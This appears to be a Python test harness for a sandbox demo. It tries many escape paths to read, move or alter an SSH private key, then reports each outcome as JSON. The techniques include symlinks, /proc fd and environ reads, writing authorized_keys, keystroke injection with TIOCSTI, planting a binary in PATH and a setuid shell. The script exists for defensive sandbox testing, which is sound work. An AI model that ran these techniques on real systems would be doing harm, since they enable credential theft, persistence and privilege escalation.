"""Test agent for ``babylon60 demo``: tries one access path and reports it.

Runs as ``python -I -S -B -c <this source> <config-json>`` with the standard
library only, inside or outside the sandbox. It prints a single JSON line with
the outcome and up to 256 bytes of whatever it obtained (hex). The launcher
decides what counts as an effect; this script never judges its own success.
"""

import ctypes
import errno
import fcntl
import json
import os
import re
import select
import socket
import struct
import subprocess
import sys
import termios
import time

cfg = json.loads(sys.argv[1])
HOME, WS, KEY = cfg["home"], cfg["ws"], cfg["key"]
SSH_DIR = os.path.dirname(KEY)
LINUX = sys.platform.startswith("linux")
XATTR_NOFOLLOW = 0x0001  # macOS <sys/xattr.h>
TIOCSTI = getattr(termios, "TIOCSTI", 0x5412 if LINUX else 0x80017472)


def _read_fd(fd):
    try:
        return os.read(fd, 4096)
    finally:
        os.close(fd)


def _read(path, flags=0, dir_fd=None):
    return _read_fd(os.open(path, os.O_RDONLY | flags, dir_fd=dir_fd))


def _libc():
    # macOS: libSystem re-exports libsystem_kernel (clonefile, xattr calls).
    return ctypes.CDLL(None if LINUX else "/usr/lib/libSystem.B.dylib", use_errno=True)


def _raise_errno(what):
    err = ctypes.get_errno()
    raise OSError(err, f"{what}: {os.strerror(err)}")


def _listxattr(path):
    if hasattr(os, "listxattr"):
        return os.listxattr(path)
    listxattr = _libc().listxattr
    listxattr.argtypes = (ctypes.c_char_p, ctypes.c_char_p, ctypes.c_size_t, ctypes.c_int)
    listxattr.restype = ctypes.c_ssize_t
    size = listxattr(os.fsencode(path), None, 0, XATTR_NOFOLLOW)
    if size < 0:
        _raise_errno("listxattr")
    buffer = ctypes.create_string_buffer(max(size, 1))
    size = listxattr(os.fsencode(path), buffer, size, XATTR_NOFOLLOW)
    if size < 0:
        _raise_errno("listxattr")
    return [name.decode("utf-8", "replace") for name in buffer.raw[:size].split(b"\0") if name]


def _setxattr(path, name, value):
    if hasattr(os, "setxattr"):
        os.setxattr(path, name, value)
        return
    setxattr = _libc().setxattr
    setxattr.argtypes = (
        ctypes.c_char_p,
        ctypes.c_char_p,
        ctypes.c_char_p,
        ctypes.c_size_t,
        ctypes.c_uint32,
        ctypes.c_int,
    )
    setxattr.restype = ctypes.c_int
    if setxattr(os.fsencode(path), name.encode(), value, len(value), 0, XATTR_NOFOLLOW) != 0:
        _raise_errno("setxattr")


def _pending_input(fd):
    return struct.unpack("i", fcntl.ioctl(fd, termios.FIONREAD, b"\0\0\0\0"))[0]


def _target_from_readme():
    with open(os.path.join(WS, "README.md"), encoding="utf-8") as handle:
        match = re.search(r"~/[^\s`'\"]+", handle.read())
    if not match:
        raise OSError(errno.ENOENT, "no instruction found in README.md")
    return os.path.join(os.environ["HOME"], match.group(0)[2:])


def v01_follow_readme():
    return _read(_target_from_readme())


def v02_cat_child_with_home_override():
    env = {"PATH": "/usr/bin:/bin", "HOME": "/", "LC_ALL": "C"}
    done = subprocess.run(["/bin/cat", KEY], env=env, capture_output=True, timeout=10)
    if done.returncode == 0:
        return done.stdout
    message = done.stderr.decode("utf-8", "replace")
    for code in (errno.EACCES, errno.EPERM, errno.ENOENT):
        if os.strerror(code) in message:
            raise OSError(code, message.strip())
    raise OSError(errno.EIO, message.strip())


def v03_symlink_from_workspace():
    link = os.path.join(WS, "notes.txt")
    os.symlink(KEY, link)
    return _read(link)


def v04_hardlink_into_workspace():
    target = os.path.join(WS, "notes-hard.txt")
    os.link(KEY, target)
    return _read(target)


def v05_rename_into_workspace():
    target = os.path.join(WS, "moved-key")
    os.rename(KEY, target)
    return _read(target)


def v06_dotdot_traversal():
    return _read(os.path.relpath(KEY, WS))


def v07_proc_self_root():
    return _read("/proc/self/root" + KEY)


def v08_opath_reopen():
    fd = os.open(KEY, os.O_PATH)
    try:
        return _read(f"/proc/self/fd/{fd}")
    finally:
        os.close(fd)


def v09_openat_dirfd():
    flags = (os.O_PATH if LINUX else os.O_RDONLY) | os.O_DIRECTORY
    dfd = os.open(SSH_DIR, flags)
    try:
        return _read(os.path.basename(KEY), dir_fd=dfd)
    finally:
        os.close(dfd)


def v10_list_ssh_dir():
    return "\n".join(sorted(os.listdir(SSH_DIR))).encode()


def v11_descriptor_of_other_process():
    return _read(f"/proc/{cfg['decoy_pid']}/fd/{cfg['decoy_fd']}")


def v12_namespace_bind_mount():
    libc = ctypes.CDLL(None, use_errno=True)
    if libc.unshare(0x10000000 | 0x00020000) != 0:  # CLONE_NEWUSER | CLONE_NEWNS
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))
    target = os.path.join(WS, "mounted")
    open(target, "wb").close()
    if libc.mount(KEY.encode(), target.encode(), None, 4096, None) != 0:  # MS_BIND
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))
    return _read(target)


def v13_write_authorized_keys():
    fd = os.open(os.path.join(SSH_DIR, "authorized_keys"), os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    try:
        os.write(fd, b"ssh-ed25519 AAAA babylon60-demo\n")
    finally:
        os.close(fd)
    return b""


def v14_truncate_key():
    os.truncate(KEY, 0)
    return b""


def v15_other_terminal():
    # Another tab of the same user: whatever is typed there is in its input queue.
    fd = os.open(cfg["tty"], os.O_RDWR | os.O_NOCTTY | os.O_NONBLOCK)
    try:
        ready, _, _ = select.select([fd], [], [], 5)
        if not ready:
            raise OSError(errno.ETIMEDOUT, "nothing typed on the other terminal")
        return os.read(fd, 4096)
    finally:
        os.close(fd)


def v16_unix_socket_outside():
    with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as client:
        client.settimeout(5)
        client.connect(cfg["socket"])
        return client.recv(4096)


def v17_type_into_terminal():
    fd = os.open("/dev/tty", os.O_RDWR)
    try:
        for byte in cfg["marker"].encode() + b"\n":
            fcntl.ioctl(fd, TIOCSTI, bytes([byte]))
        # Stay until the user's shell (the harness) has read the injected line: on
        # macOS the exit of a session leader revokes its controlling terminal.
        deadline = time.monotonic() + 3
        while _pending_input(fd) and time.monotonic() < deadline:
            time.sleep(0.02)
    finally:
        os.close(fd)
    return b""


def v18_plant_in_path():
    target = os.path.join(os.environ["PATH"].split(os.pathsep)[0], "git")
    fd = os.open(target, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o755)
    try:
        os.write(fd, b'#!/bin/sh\nexec /usr/bin/git "$@"\n')
        os.fchmod(fd, 0o755)
    finally:
        os.close(fd)
    return b""


def v19_data_volume_firmlink():
    return _read("/System/Volumes/Data" + os.path.realpath(KEY))


def v20_case_variant_path():
    # APFS is case-insensitive by default; every component a deny rule names, home included.
    return _read(KEY.swapcase())


def v21_clonefile_into_workspace():
    try:
        clonefile = _libc().clonefile
    except AttributeError:
        raise OSError(errno.ENOSYS, "clonefile(2) is not available") from None
    clonefile.argtypes = (ctypes.c_char_p, ctypes.c_char_p, ctypes.c_uint32)
    clonefile.restype = ctypes.c_int
    target = os.path.join(WS, "cloned-key")
    if clonefile(os.fsencode(KEY), os.fsencode(target), 0) != 0:
        _raise_errno("clonefile")
    return _read(target)


def v22_environment_of_other_process():
    # The user's shell or IDE keeps tokens in its environment (GH_TOKEN, AWS_*...).
    return _read(f"/proc/{cfg['decoy_pid']}/environ")


def _syscall(name, *args):
    libc = ctypes.CDLL(None, use_errno=True)
    libc.syscall.restype = ctypes.c_long
    result = libc.syscall(cfg["syscalls"][name], *args)
    if result < 0:
        _raise_errno(name)
    return result


def v23_user_keyring():
    # A credential helper or a KEYRING: Kerberos cache keeps secrets in the kernel keyrings.
    buffer = ctypes.create_string_buffer(4096)
    size = _syscall("keyctl", 11, cfg["key_serial"], buffer, len(buffer))  # KEYCTL_READ
    return buffer.raw[: min(size, len(buffer))]


def v24_sysv_shared_memory():
    libc = ctypes.CDLL(None, use_errno=True)
    libc.shmget.restype = ctypes.c_int
    libc.shmat.restype = ctypes.c_void_p
    libc.shmat.argtypes = (ctypes.c_int, ctypes.c_void_p, ctypes.c_int)
    ident = libc.shmget(cfg["shm_key"], 0, 0)
    if ident < 0:
        _raise_errno("shmget")
    address = libc.shmat(ident, None, 0o10000)  # SHM_RDONLY
    if address in (None, ctypes.c_void_p(-1).value):
        _raise_errno("shmat")
    try:
        return ctypes.string_at(address, 64)
    finally:
        libc.shmdt(ctypes.c_void_p(address))


def v25_plant_setuid_program():
    # With --allow-root, a setuid-root shell left in the workspace is a root shell for any local user.
    target = os.path.join(WS, "helper")
    with open(target, "w", encoding="ascii") as handle:
        handle.write("#!/bin/sh\nexec /bin/sh\n")
    os.chmod(target, 0o4755)
    return b""


def l1_metadata_read():
    st = os.stat(KEY)
    names = _listxattr(KEY)
    return f"size={st.st_size} mode={st.st_mode & 0o7777:o} xattrs={len(names)}".encode()


def l2_preexisting_hardlink():
    return _read(cfg["prelinked"])


def l4_metadata_change():
    errors = []
    for change in (
        lambda: os.chmod(KEY, 0o644),
        lambda: os.utime(KEY, (0, 0)),
        lambda: _setxattr(KEY, "user.babylon60-demo", b"planted"),
    ):
        try:
            change()
        except OSError as exc:
            errors.append(exc)
    if errors:
        raise errors[0]
    return b""


def l5_inotify_watch():
    libc = _libc()
    fd = libc.inotify_init1(os.O_NONBLOCK | os.O_CLOEXEC)
    if fd < 0:
        _raise_errno("inotify_init1")
    try:
        wd = libc.inotify_add_watch(fd, os.fsencode(SSH_DIR), 0xFFF)  # IN_ALL_EVENTS
        if wd < 0:
            _raise_errno("inotify_add_watch")
        return f"watch={wd}".encode()
    finally:
        os.close(fd)


def p1_workspace_read_write():
    path = os.path.join(WS, "work.txt")
    with open(path, "w", encoding="utf-8") as handle:
        handle.write("ok")
    with open(path, encoding="utf-8") as handle:
        return handle.read().encode()


def p2_rename_inside_workspace():
    first, second = os.path.join(WS, "a.txt"), os.path.join(WS, "b.txt")
    with open(first, "w", encoding="utf-8") as handle:
        handle.write("ok")
    os.rename(first, second)
    return _read(second)


def p3_exec_shell():
    done = subprocess.run(["/bin/sh", "-c", "echo ok"], capture_output=True, timeout=10, check=True)
    return done.stdout


def p4_read_system_file():
    return _read("/etc/hosts")[:16]


def p5_private_tmp():
    path = os.path.join(os.environ["TMPDIR"], "scratch.txt")
    with open(path, "w", encoding="utf-8") as handle:
        handle.write("ok")
    return _read(path)


def p6_loopback_network():
    with socket.socket() as server:
        server.bind(("127.0.0.1", 0))
        server.listen(1)
        with socket.create_connection(server.getsockname(), timeout=5) as client:
            peer, _ = server.accept()
            with peer:
                client.sendall(b"ok")
                return peer.recv(2)


def p7_unix_socketpair():
    left, right = socket.socketpair()
    with left, right:
        left.sendall(b"ok")
        return right.recv(2)


VECTORS = {name.split("_", 1)[0].upper(): fn for name, fn in globals().items() if re.match(r"^[vlp]\d+_", name)}


def main():
    vector = cfg["vector"]
    report = {"vector": vector, "result": "ok", "data": "", "detail": ""}
    try:
        data = VECTORS[vector]()
        report["data"] = (data or b"")[:256].hex()
    except OSError as exc:
        report["result"] = errno.errorcode.get(exc.errno or 0, f"E{exc.errno}")
        report["detail"] = str(exc.strerror or exc)[:200]
    except subprocess.SubprocessError as exc:
        report["result"] = "ESUBPROCESS"
        report["detail"] = str(exc)[:200]
    print(json.dumps(report), flush=True)


main()
